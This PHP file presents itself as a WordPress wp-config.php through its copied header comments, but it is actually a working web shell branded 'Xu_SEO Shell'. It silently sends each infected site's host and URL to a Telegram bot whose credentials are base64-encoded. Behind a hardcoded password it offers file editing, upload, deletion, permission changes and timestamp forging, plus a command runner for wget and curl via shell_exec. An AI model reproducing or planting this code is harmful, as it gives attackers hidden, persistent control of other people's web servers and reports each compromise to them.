<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 * Database settings - You can get this info from your web host ** //
 ** The name of the database for WordPress *
*DB_NAME', 'database_name_here

*Database username 
*DB_USER', 'username_here

** Database password 
* DB_PASSWORD', 'password_here'

** Database hostname *
*DB_HOST', 'localhost'
*/

error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

$tk  = base64_decode("N123zA1MzQxMzpBQUVrYnZES1ZneE9neUlYV1N4YlZPek1qR0NRdXp3cFJiNA==");
$cid = base64_decode("Nz123TI1NjU4Ng==");

function reportTelegram($msg){
    global $tk,$cid;
    $id = sys_get_temp_dir().'/Xu_SEO_'.md5($msg);
    if(!file_exists($id)){
        @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=".urlencode($msg));
        @file_put_contents($id,time());
    }
}

if(!isset($_SESSION['telegram_reported'])){
    $uri = urldecode(parse_url($_SERVER['REQUEST_URI'],PHP_URL_PATH));
    $path = $_SERVER['DOCUMENT_ROOT'].$uri;
    if(is_file($path)){
        $host = $_SERVER['HTTP_HOST'];
        $url  = (isset($_SERVER['HTTPS'])?'https':'http').'://'.$host.$uri;
        reportTelegram("Setoran shell di web:\n$host\n$url");
        $_SESSION['telegram_reported'] = true;
    }
}

$pass = "kopihitam12";
if(isset($_GET['logout'])){
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}
if(!isset($_SESSION['auth'])){
    if(isset($_POST['pass']) && $_POST['pass']===$pass){
        $_SESSION['auth']=true;
    } else {
        echo "<form method='POST'><input type='password' name='pass' autofocus><button>Login</button></form>";
        exit;
    }
}

$home = getcwd();
$cwd  = isset($_GET['path']) ? realpath($_GET['path']) : $home;
if(!$cwd || !is_dir($cwd)) $cwd=$home;
chdir($cwd);

function perms($f){
    return substr(sprintf('%o',fileperms($f)),-4);
}
function is_path_safe($file){
    global $cwd;
    return realpath(dirname($file))===realpath($cwd);
}

if(isset($_POST['do_chmod'],$_POST['chmod_file'],$_POST['chmod_val'])){
    $file = $_POST['chmod_file'];
    $val  = preg_replace('/[^0-7]/','',$_POST['chmod_val']);
    if((strlen($val)==3 || strlen($val)==4) && is_path_safe($file)){
        if(@chmod($file,octdec($val))){
            echo "<p>CHMOD $val success : ".htmlspecialchars(basename($file))."</p>";
        } else {
            echo "<p>CHMOD failed : ".htmlspecialchars(basename($file))."</p>";
        }
    } else {
        echo "<p>Invalid permission or path.</p>";
    }
}

if(isset($_POST['editfile'],$_POST['src'])){
    file_put_contents($_POST['editfile'], $_POST['src']);
    echo "<p>Saved.</p>";
}

if(isset($_GET['rename']) && isset($_POST['newname'])){
    $old = $cwd.'/'.basename($_GET['rename']);
    $new = $cwd.'/'.basename($_POST['newname']);
    @rename($old,$new);
    echo "<p>Renamed.</p>";
}
if(isset($_GET['rename']) && !isset($_POST['newname'])){
    $f = basename($_GET['rename']);
    echo "<form method='POST'>Rename: <input name='newname' value='".htmlspecialchars($f)."'> <button>OK</button></form><hr>";
}

if(isset($_GET['touch']) && isset($_POST['newtime'])){
    $t = $cwd.'/'.basename($_GET['touch']);
    @touch($t, strtotime($_POST['newtime']));
    echo "<p>Timestamp updated.</p>";
}
if(isset($_GET['touch']) && !isset($_POST['newtime'])){
    $f = $cwd.'/'.basename($_GET['touch']);
    $m = date("Y-m-d H:i:s", @filemtime($f));
    echo "<form method='POST'>Touch: <input name='newtime' value='$m'> <button>Update</button></form><hr>";
}

if(isset($_GET['delete'])){
    $t = $cwd.'/'.basename($_GET['delete']);
    if(is_file($t)){ @unlink($t); echo "<p>File deleted.</p>"; }
}

?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Xu_SEO Shell</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;font-size:13px;padding:10px}
a{color:#0ff;text-decoration:none}a:hover{color:#ff0}
input,textarea,button{background:#111;color:#0f0;border:1px solid #444}
table{width:100%;border-collapse:collapse}
td,th{border:1px solid #333;padding:3px}
.menu{text-align:center;margin:10px}
.menu a{color:#f00;margin:0 8px}
pre{margin:0}
</style>
</head>
<body>

<h3>Xu_SEO Shell</h3>
<pre>
OS        : <?=php_uname()?>

PHP       : <?=phpversion()?>

Server IP : <?=($_SERVER['SERVER_ADDR']??gethostbyname(gethostname()))?>

Client IP : <?=($_SERVER['REMOTE_ADDR']??'N/A')?>

CWD       : <?=htmlspecialchars($cwd)?>
</pre>

<div class="menu">
<a href="?path=<?=urlencode($home)?>">[ Home ]</a>
<a href="https://t.me/Xu_SEO_host" target="_blank">[ Buy Tools ]</a>
<a href="?logout=1">[ Logout ]</a>
</div>

<h4>Path:
<?php
$parts = explode('/',trim($cwd,'/'));
$build='';
foreach($parts as $p){
    $build.="/$p";
    echo "<a href='?path=".urlencode($build)."'>$p/</a>";
}
?>
</h4>

<?php
if(isset($_GET['edit'])){
    $f=$cwd.'/'.basename($_GET['edit']);
    if(is_file($f)){
        echo "<form method='POST'>
        <textarea name='src' rows='20' style='width:100%'>".htmlspecialchars(file_get_contents($f))."</textarea>
        <input type='hidden' name='editfile' value='".htmlspecialchars($f)."'>
        <button>Save</button>
        </form><hr>";
    }
}

$files = scandir($cwd);
echo "<table>
<tr><th>Name</th><th>Size</th><th>CHMOD</th><th>Modified</th><th>Act</th></tr>";

foreach($files as $f){
    if($f==".") continue;
    $p=$cwd.'/'.$f;
    $dir=is_dir($p);
    echo "<tr><td>";
    if($f==".."){
        echo "<a href='?path=".urlencode(dirname($cwd))."'>..</a>";
    } elseif($dir){
        echo "<a href='?path=".urlencode($p)."'>$f</a>";
    } else {
        echo "<a href='?path=".urlencode($cwd)."&edit=".urlencode($f)."'>$f</a>";
    }
    echo "</td>
    <td>".($dir?'-':@filesize($p))."</td>
    <td>
        <form method='POST' style='margin:0'>
            <input type='hidden' name='chmod_file' value=\"".htmlspecialchars($p)."\">
            <input name='chmod_val' value='".perms($p)."' size='4'>
            <button name='do_chmod'>Set</button>
        </form>
    </td>
    <td>".date("Y-m-d H:i:s",@filemtime($p))."</td>
    <td>";
    if(!$dir){
        echo "
        <a href='?path=".urlencode($cwd)."&edit=".urlencode($f)."'>E</a>
        <a href='?path=".urlencode($cwd)."&rename=".urlencode($f)."'>R</a>
        <a href='?path=".urlencode($cwd)."&touch=".urlencode($f)."'>T</a>
        <a href='".htmlspecialchars($f)."' download>S</a>
        <a href='?path=".urlencode($cwd)."&delete=".urlencode($f)."' onclick=\"return confirm('Delete?')\">D</a>";
    }
    echo "</td></tr>";
}
echo "</table>";
?>

<hr>
<form method="POST">
<b>Command:</b>
<input type="text" name="cmd" style="width:65%" placeholder="wget | curl | unzip | mv | mkdir">
<button type="submit">Run</button>
</form>

<?php
if(isset($_POST['cmd']) && trim($_POST['cmd'])!==''){
    $cmd = trim($_POST['cmd']);
    $allowed = ['wget','curl','unzip','mv','mkdir'];
    $base = strtolower(strtok($cmd,' '));

    if(!in_array($base,$allowed,true)){
        echo "<pre>Command not allowed.</pre>";
    } elseif(preg_match('/[;&|`$<>]/',$cmd)){
        echo "<pre>Invalid characters detected.</pre>";
    } else {
        echo "<pre>";
        if(function_exists('shell_exec')){
            echo htmlspecialchars(shell_exec($cmd));
        } elseif(function_exists('exec')){
            exec($cmd,$out); echo htmlspecialchars(implode("\n",$out));
        } elseif(function_exists('system')){
            ob_start(); system($cmd); echo htmlspecialchars(ob_get_clean());
        } else {
            echo "No execution function available.";
        }
        echo "</pre>";
    }
}
?>

<hr>
<form method="POST" enctype="multipart/form-data">
Upload: <input type="file" name="upload"> <button>Upload</button>
</form>
<form method="POST">New Dir: <input name="mkdir"> <button>Create</button></form>
<form method="POST">New File: <input name="mkfile"> <button>Create</button></form>

<?php
if(!empty($_POST['mkfile'])) @file_put_contents($cwd.'/'.basename($_POST['mkfile']),'');
if(!empty($_POST['mkdir'])) @mkdir($cwd.'/'.basename($_POST['mkdir']));
if(isset($_FILES['upload']) && $_FILES['upload']['error']==0){
    @move_uploaded_file($_FILES['upload']['tmp_name'],$cwd.'/'.basename($_FILES['upload']['name']));
    echo "<p>Uploaded.</p>";
}
?>

<footer style="text-align:center;color:#555;margin-top:20px">© Xu_SEO Shell</footer>
</body>
</html>